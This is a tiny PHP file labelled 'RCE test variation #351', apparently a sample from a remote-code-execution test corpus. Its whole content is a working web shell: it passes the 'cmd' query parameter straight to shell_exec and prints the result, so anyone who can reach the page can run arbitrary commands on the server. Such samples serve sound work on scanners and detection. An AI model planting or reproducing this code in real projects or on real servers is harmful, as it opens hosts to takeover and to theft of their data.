<?php
// RCE test variation #351
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>